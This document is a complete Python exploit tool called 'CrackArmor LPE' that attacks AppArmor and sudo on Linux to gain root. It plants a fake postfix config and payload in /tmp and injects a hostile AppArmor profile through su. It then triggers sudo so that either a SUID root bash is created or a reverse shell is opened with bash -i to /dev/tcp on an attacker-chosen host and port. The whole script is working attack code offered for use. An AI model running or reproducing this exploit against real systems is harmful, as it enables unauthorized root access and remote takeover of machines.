#!/usr/bin/env python3
# Based on: https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt
# Noob LPE version, NOT use-after-free
# https://exploit.se/

import os
import shutil
import subprocess
import sys
import time
import argparse

WORKDIR = "/tmp/postfix"
PROFILE_PATH = "/tmp/sudo.pf"
ROOTSHELL = "/tmp/rootbash"


def run(cmd: list[str]):
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        print("[-] Command failed:", result.stderr.decode())
        sys.exit(1)


def setup(args):
    print(f"[+] Setting up payload ({args.mode})")

    shutil.rmtree(WORKDIR, ignore_errors=True)
    os.makedirs(WORKDIR, exist_ok=True)

    with open(f"{WORKDIR}/main.cf", "w") as f:
        f.write("command_directory = /tmp/postfix\n")

    if args.mode == "local":
        payload = f"""#!/bin/bash
install -m 4755 /bin/bash {ROOTSHELL}
"""
    else:
        payload = f"""#!/bin/bash
bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1
"""

    path = f"{WORKDIR}/postdrop"
    with open(path, "w") as f:
        f.write(payload)

    os.chmod(path, 0o755)


def build_profile():
    print("[+] Building profile")

    profile = b"""
/usr/bin/sudo {
  allow file,
  allow signal,
  allow network,
  allow capability,
  deny capability setuid,
}
"""

    result = subprocess.run(
        ["apparmor_parser", "-K", "-o", PROFILE_PATH],
        input=profile,
        capture_output=True,
    )
    if result.returncode != 0:
        print("[-] apparmor_parser failed:", result.stderr.decode())
        sys.exit(1)


def inject():
    print("[+] Injecting profile")

    user = os.environ["USER"]
    inner_cmd = f"stty raw && cat {PROFILE_PATH}"

    with open("/sys/kernel/security/apparmor/.replace", "wb") as dst:
        result = subprocess.run(
            ["su", "-P", "-c", inner_cmd, user],
            stdout=dst,
        )

    if result.returncode != 0:
        print("[-] su failed")
        sys.exit(1)


def trigger(args):
    print("[+] Triggering exploit")
    print("\n========== IMPORTANT ==========")
    if args.mode == "local":
        print(f"[!] SUID shell: {ROOTSHELL}")
    else:
        print(f"[!] Reverse shell sent to: {args.lhost}:{args.lport}")
    print("[!] sudo is broken (AppArmor profile replaced)")
    print("[!] Restore with: python3 script.py --restore")
    print("===============================\n")

    subprocess.run(
        ["sudo", "lpePlease"],
        env={"MAIL_CONFIG": WORKDIR},
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

def spawn_shell(args):
    if args.mode != "local":
        return

    for _ in range(10):
        if os.path.isfile(ROOTSHELL):
            break
        time.sleep(0.1)

    if not os.path.isfile(ROOTSHELL):
        print("[-] Exploit failed: SUID shell not found")
        sys.exit(1)

    os.execv(ROOTSHELL, [ROOTSHELL, "-p"])


def restore():
    print("[+] Restoring sudo AppArmor profile")

    user = os.environ["USER"]
    inner_cmd = "stty raw && echo -n /usr/bin/sudo"

    with open("/sys/kernel/security/apparmor/.remove", "wb") as dst:
        result = subprocess.run(
            ["su", "-P", "-c", inner_cmd, user],
            stdout=dst,
        )

    if result.returncode != 0:
        print("[-] restore failed")
        sys.exit(1)

def parse_args():
    parser = argparse.ArgumentParser(description="CrackArmor LPE tool")
    parser.add_argument("--mode", choices=["local", "reverse"], default="local")
    parser.add_argument("--lhost", default="127.0.0.1", help="Listen host (default: %(default)s)")
    parser.add_argument("--lport", type=int, default=4488, help="Listen port (default: %(default)s)")
    parser.add_argument("--restore", action="store_true", help="Restore sudo AppArmor profile")
    return parser.parse_args()

def main():
    print("--=== CrackArmor LPE ===--")
    args = parse_args()
    if args.restore:
        restore()
        return

    setup(args)
    build_profile()
    inject()
    trigger(args)
    spawn_shell(args)


if __name__ == "__main__":
    main()
